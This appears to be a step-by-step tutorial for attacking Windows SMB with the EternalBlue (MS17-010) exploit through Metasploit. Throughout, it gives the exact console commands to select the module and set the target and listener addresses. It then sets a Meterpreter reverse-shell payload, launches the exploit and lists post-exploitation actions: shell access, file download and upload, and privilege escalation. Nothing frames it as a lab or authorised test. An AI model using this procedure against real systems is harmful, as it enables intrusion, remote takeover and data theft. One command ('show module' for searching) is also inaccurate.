# Exploiting MS17-010 EternalBlue Vulnerability using Metasploit

## 1. Set Up Your Environment
Ensure you have Metasploit installed on your system. You can use Kali Linux, Parrot OS, or install Metasploit manually on your preferred OS.

## 2. Start Metasploit Framework
Open a terminal and launch Metasploit by typing:

```bash
msfconsole
```

Once inside Metasploit, you can search for the EternalBlue module using:

```bash
show module
```

## 3. Search for the MS17-010 EternalBlue Exploit Module
To search for a specific module:

```bash
search ms17-010
```

## 4. Select the Exploit Module
After finding the appropriate exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue), select it by entering:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## 5. Set Required Parameters

```bash
Set RHOSTS <Target IP>
```

Review other options that might need configuration using the `show options` command and set them accordingly. Common options include `LHOST`, `RPORT`, etc.
-----------------------------------------------------------------------------
| Parameter | Description                           | Example Usage         |
|-----------|---------------------------------------|-----------------------|
| RHOSTS    | Remote host(s) IP address(es)         | set RHOSTS 192.168.1.5|
| LHOST     | Local host listening IP for payloads  | set LHOST 192.168.1.2 |
| RPORT     | Remote port for the target service    | set RPORT 445         |
-----------------------------------------------------------------------------
## 6. Set Payload

After selecting the exploit module, you need to set the payload that will be delivered to the compromised system. This payload determines the action or code executed on the target after exploitation.
For example, to set the payload as a reverse shell for a Windows target:

```bash
set payload windows/meterpreter/reverse_tcp
```

## 7. Execute the Exploit
Once all necessary options are set, run the exploit by typing:

```bash
exploit
```

The exploit might take some time to run. Upon successful exploitation, Metasploit may display the meterpreter prompt, indicating a successful compromise of the target system.

## 8. Post-Exploitation Actions

Once the exploit succeeds and you gain access to the compromised system, you can perform various post-exploitation actions using the `meterpreter` prompt.

### Some useful post-exploitation commands:

- **System Commands**: Execute system commands on the target system using :
  
```bash
shell
```
  
Gather System Information: Retrieve system information like system details, user information, etc. using commands such as `sysinfo`, `getuid`, etc.

File Operations: Manipulate files on the compromised system using commands like `download`, `upload`, `ls`, `cd`, etc.

Privilege Escalation: Attempt to elevate privileges on the target system using modules like `getsystem`, `migrate`, etc.


